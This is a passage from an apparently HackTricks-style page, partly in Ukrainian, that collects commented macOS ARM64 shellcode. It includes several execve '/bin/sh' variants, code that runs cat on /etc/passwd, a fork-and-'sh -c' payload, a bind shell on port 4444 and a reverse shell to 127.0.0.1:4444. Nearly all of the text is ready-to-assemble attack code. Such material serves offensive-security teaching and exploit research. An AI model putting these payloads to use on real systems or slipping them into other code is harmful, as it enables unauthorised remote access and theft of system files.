
return 0;
}
```
</details>

#### Shell

Взято з [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) і пояснено.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Читання за допомогою cat

Мета — виконати `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, тому другий аргумент (x1) — це масив параметрів (у пам'яті це означає стек адрес).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Викликати команду через sh у форку, щоб головний процес не був завершений
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell з [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) на порту **4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

З [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell до **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
